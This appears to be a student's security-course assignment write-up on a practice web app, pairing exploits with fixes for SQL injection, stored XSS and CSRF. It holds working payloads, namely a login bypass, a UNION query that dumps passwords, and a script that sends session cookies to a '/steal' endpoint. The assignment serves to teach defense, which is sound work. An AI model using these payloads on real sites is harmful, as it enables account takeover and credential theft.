# Assignment 4 Write-up — [Enter Your Name Here]

## V1 — SQL Injection
- Exploit (login bypass): `quartermaster' -- ` — It worked because it closed the username string and commented out the password check, forcing the query to evaluate as true for that user.
- Exploit (UNION exfil): `zzz%' UNION SELECT id, username || ':' || password, credits FROM users -- ` — I recovered the usernames and plaintext passwords for all users in the database, including the hidden quartermaster account.
- Fix: In `server.js` for both `/login` and `/search`, I replaced string concatenation with parameterized queries using `?` placeholders, forcing the database to treat the input strictly as data rather than executable code.

## V2 — Stored XSS
- Exploit: `<script>fetch('http://localhost:8000/steal?c='+encodeURIComponent(document.cookie))</script>` — This was stored in the comment section of an item and affected any user (like Alice) who subsequently viewed that item's page.
- Fix: I wrapped `c.body` with the `esc()` function in `views.js` to encode HTML entities. In `server.js`, I added a `Content-Security-Policy` header to restrict script execution and added `httpOnly: true` to the session cookie to prevent JavaScript access.
- One sentence: CSP helps even if you miss an escaping bug because it instructs the browser to block unauthorized inline scripts and external domains, neutralizing the injected code before it can run.

## V3 — CSRF
- Exploit: The `csrf-poc.html` file contained a hidden form pointing to `/wallet/transfer` that auto-submitted on page load. This worked because the victim's browser automatically attached their valid CampusSwap session cookie to the cross-site request.
- Fix: I generated a random CSRF token during login, stored it in the session, and required it as a hidden field (`_csrf`) in the transfer form, validating it on the server side. I also added `sameSite: 'strict'` to the session cookie.
- One sentence: The attacker cannot forge a valid token because the same-origin policy prevents their malicious site from reading the token out of the victim's legitimate session.

## Time spent
[Enter hours spent here] — Getting the syntax right for the SQL UNION attack took a little bit of trial and error!
